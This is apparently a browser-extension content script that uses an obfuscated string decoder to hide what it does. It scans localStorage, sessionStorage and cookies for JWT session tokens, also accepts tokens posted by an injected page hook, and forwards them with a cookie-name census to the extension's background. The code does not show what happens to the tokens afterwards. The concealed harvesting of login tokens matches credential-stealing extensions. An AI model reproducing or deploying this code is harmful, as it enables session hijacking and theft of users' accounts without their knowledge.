var __S_content_5e_capture_js=(function(){var T="HMCDjaCltoKmZ2ZURU4oPwQAB73w/dvTorON2dkwRFdgCXg4DlHzpo6J4ueKz63QUFkIaF5hI1ZeudK3+p+d4ICp2FhuMVMGbmkCRyqvEVYob2gQHhUuNtrR3vztk4GlBl0kNw4bGg==",P=[29,0,78,96],C=[],B,M="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";function L(){if(B)return B;var o=[],b=0,s=0,i=0,v=0;for(i=0;i<T.length;i++){v=M.indexOf(T.charAt(i));if(v<0)continue;b=(b<<6)|v;s+=6;if(s>=8){s-=8;o.push((b>>s)&255)}}B=o;return o}function U(a,f,n){var o="",i=f,e=f+n;while(i<e){var c=a[i++];if(c<128)o+=String.fromCharCode(c);else if(c>191&&c<224)o+=String.fromCharCode(((c&31)<<6)|(a[i++]&63));else if(c>223&&c<240)o+=String.fromCharCode(((c&15)<<12)|((a[i++]&63)<<6)|(a[i++]&63));else{var q=((c&7)<<18)|((a[i++]&63)<<12)|((a[i++]&63)<<6)|(a[i++]&63);q-=65536;o+=String.fromCharCode(55296+(q>>10),56320+(q&1023))}}return o}function D(p){if(C[p]!==undefined)return C[p];var b=L(),i=p+1,k=0,n=b[p],r=[];for(k=0;k<n;k++){r.push(b[i]^((0x9e+0x1f*p+0x0d*k)&255));i++}return C[p]=U(r,0,r.length)}return function(k){return D(P[k])}})();
var __VG=(typeof self!=="undefined"&&self)?self:((typeof globalThis!=="undefined")?globalThis:this);


(function () {
    'use strict';
    const JWT_SUB_RE = new RegExp(__S_content_5e_capture_js(0));   
    const KNOWN_NAME_RE = new RegExp(__S_content_5e_capture_js(1), 'i');
    const POLL_MS = 2500, POLL_WINDOW_MS = 120000;
    let sent = '';
    let timer = null;

    function pickBest(cands) {
        let best = '';
        for (const c of cands) {
            if (!c || !c.value) continue;
            if (KNOWN_NAME_RE.test(String(c.name || ''))) return String(c.value);
            if (!best && JWT_SUB_RE.test(String(c.value))) best = String(c.value);
        }
        return best;
    }

    function scanOnce() {
        
        const cands = [];
        try {
            for (const store of [window.localStorage, window.sessionStorage]) {
                if (!store || !store.length) continue;
                for (let i = 0; i < store.length; i++) {
                    const k = store.key(i);
                    if (!k) continue;
                    const v = String(store.getItem(k) || '');
                    const m = v.match(JWT_SUB_RE);   
                    if (m) cands.push({ name: k, value: m[0] });
                }
            }
        } catch (e0) {  }
        try {
            for (const kv of String(document[__S_content_5e_capture_js(3)] || '').split(';')) {
                const i = kv.indexOf('=');
                if (i <= 0) continue;
                const name = kv.slice(0, i).trim();
                let value = kv.slice(i + 1).trim();
                try { value = decodeURIComponent(value); } catch (e1) {  }
                if (KNOWN_NAME_RE.test(name)) { cands.push({ name, value }); continue; }   
                const m = value.match(JWT_SUB_RE);
                if (m) cands.push({ name, value: m[0] });
            }
        } catch (e2) {  }
        return pickBest(cands);
    }

    function stop() { if (timer) { clearInterval(timer); timer = null; } }

    function census() {
        let ck = 0; const names = [];
        try {
            const pairs = String(document[__S_content_5e_capture_js(3)] || '').split(';').filter(function (p) { return p.trim(); });
            ck = pairs.length;
            for (const p of pairs) {
                const i = p.indexOf('=');
                if (i > 0) names.push(p.slice(0, i).trim());
            }
        } catch (e0) {  }
        let ls = 0, ss = 0;
        try { ls = window.localStorage.length; } catch (e1) {  }
        try { ss = window.sessionStorage.length; } catch (e2) {  }
        return { ck: ck, names: names.slice(0, 8), ls: ls, ss: ss };
    }
    function ping(c) {
        try { chrome.runtime.sendMessage({ type: 'F5E_CAPTURE_PING', census: c }, function () { void chrome.runtime.lastError; }); } catch (e3) {  }
    }

    try {
        window.addEventListener('message', function (ev) {
            if (ev.source !== window) return;
            var d = ev && ev.data;
            if (!d || d.__sps5eToken !== 1) return;
            var token = String(d.token || '');
            if (!new RegExp(__S_content_5e_capture_js(0)).test(token)) return;
            try {
                chrome.runtime.sendMessage({ type: __S_content_5e_capture_js(2), token: token, source: 'page_hook' }, function () { void chrome.runtime.lastError; });
            } catch (e0) {  }
        });
    } catch (e4) {  }

    function tryCapture() {
        if (sent) { stop(); return; }
        const token = scanOnce();
        if (!token || token === sent) return;
        sent = token;
        stop();
        try {
            chrome.runtime.sendMessage({ type: __S_content_5e_capture_js(2), token }, () => { void chrome.runtime.lastError; });
        } catch (e0) {  }
    }

    ping(census());

    tryCapture();
    if (!sent) {
        timer = setInterval(function () { tryCapture(); if (!sent) ping(census()); }, POLL_MS);
        setTimeout(stop, POLL_WINDOW_MS);
        try { window.addEventListener('storage', function () { if (!sent) tryCapture(); }); } catch (e3) {  }
    }
})();
